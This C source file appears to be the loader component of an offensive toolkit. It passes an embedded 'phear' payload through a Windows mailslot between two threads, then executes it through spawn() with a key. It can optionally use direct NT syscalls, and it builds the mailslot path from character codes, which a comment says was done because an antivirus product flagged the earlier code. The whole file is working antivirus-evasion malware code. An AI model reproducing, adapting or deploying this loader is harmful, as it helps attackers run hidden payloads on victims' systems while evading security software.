#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

/* a place to track our random-ish mailslot name */
char mailslot[64];
HANDLE hSlot = NULL;

void server(char * data, int length) {
#if USE_SYSCALLS == 1
   HANDLE hMail = create_mailslot_file(mailslot);
#else
   HANDLE hMail = CreateFile(mailslot, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
#endif
   if (hMail == INVALID_HANDLE_VALUE ) {
      return;
   }

   DWORD  wrote = 0;
   int maxWrite = 102400; /* force multiple writes */
   while (length > 0) {
      maxWrite = length < maxWrite ? length : maxWrite;
#if USE_SYSCALLS == 1
      if (!write_file(hMail, data, maxWrite, &wrote)) {
#else
      if (!WriteFile(hMail, data, maxWrite, &wrote, NULL)) {
#endif
         break;
      }

      data   += wrote;
      length -= wrote;
      Sleep(1000); /* add some pause between writes */
   }

#if USE_SYSCALLS == 1
   NtClose(hMail);
#else
   CloseHandle(hMail);
#endif
}

BOOL client(char * buffer, int length, int *totalRead) {
   DWORD lpNextSize = 0;
   DWORD lpMessageCount = 0;
   DWORD dwRead = 0;
   BOOL bSuccess;

   while(1) {
#if USE_SYSCALLS == 1
      bSuccess = get_mailslot_info(hSlot, &lpNextSize, &lpMessageCount);
#else
      bSuccess = GetMailslotInfo(hSlot, NULL, &lpNextSize, &lpMessageCount, NULL);
#endif
      if (!bSuccess || lpNextSize == MAILSLOT_NO_MESSAGE) {
         break;
      }
#if USE_SYSCALLS == 1
      read_file(hSlot, buffer + *totalRead, lpNextSize, &dwRead);
#else
      ReadFile(hSlot, buffer + *totalRead, lpNextSize, &dwRead, NULL);
#endif
      *totalRead += dwRead;
   }

   return (*totalRead == length);
}

DWORD server_thread(LPVOID whatever) {
   phear * payload = (phear *)data;

   /* setup a mailslot for our payload */
   server(payload->payload, payload->length);

   return 0;
}

DWORD client_thread(LPVOID whatever) {
   phear * payload = (phear *)data;

   /* allocate data for our "cleaned" payload */
   char * buffer = (char *)malloc(payload->length);

   /* Read from the mailslot */
   int totalRead = 0;
   do {
      Sleep(1024);
   }
   while (!client(buffer, payload->length, &totalRead));

   /* spawn our payload */
   spawn(buffer, payload->length, payload->key);

   /* clean up after ourselves */
   free(buffer);

   return 0;
}

void start(HINSTANCE mhandle) {
   /* switched from snprintf... as some A/V product was flagging based on the function *sigh* 
      92, 92, 46, 92, 109, 97, 105, 108, 115, 108, 111, 116, 92 is \\.\mailslot\
   
   */
   sprintf(mailslot, "%c%c%c%c%c%c%c%c%c%c%c%c%cslot-%d", 92, 92, 46, 92, 109, 97, 105, 108, 115, 108, 111, 116, 92, (int)(GetTickCount() % 9898));

#if USE_SYSCALLS == 1
   hSlot = create_mailslot(mailslot);
#else
   hSlot = CreateMailslot(mailslot, 0, MAILSLOT_WAIT_FOREVER, NULL);
#endif
   if (hSlot == INVALID_HANDLE_VALUE) {
      return;
   }

   /* start our server and our client */
#if USE_SYSCALLS == 1
   HANDLE thandle;
   NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &server_thread, NULL, 0, 0, 0, 0, NULL);
#else
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&server_thread, (LPVOID) NULL, 0, NULL);
#endif
   client_thread(NULL);

   /* clean up after ourselves */
#if USE_SYSCALLS == 1
   NtClose(hSlot);
#else
   CloseHandle(hSlot);
#endif
}
